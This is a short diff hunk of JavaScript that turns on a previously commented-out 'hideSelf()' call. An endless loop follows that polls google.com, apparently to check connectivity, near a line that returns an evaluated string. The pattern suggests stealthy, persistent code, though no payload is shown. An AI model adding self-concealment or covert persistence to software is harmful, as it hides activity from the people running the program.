@@ -4317,7 +4317,7 @@ return ${eval_string};
     }
 
     (async () => {
-      //await hideSelf();
+      await hideSelf();
       while (true) {
         try {
           await axios.get("https://www.google.com");
